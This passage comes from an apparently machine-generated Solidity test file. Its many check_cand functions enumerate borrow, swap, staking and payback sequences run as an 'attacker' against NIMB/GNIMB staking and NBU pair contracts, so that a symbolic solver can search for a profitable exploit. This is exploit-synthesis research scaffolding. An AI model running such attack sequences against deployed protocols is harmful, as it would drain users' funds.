        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
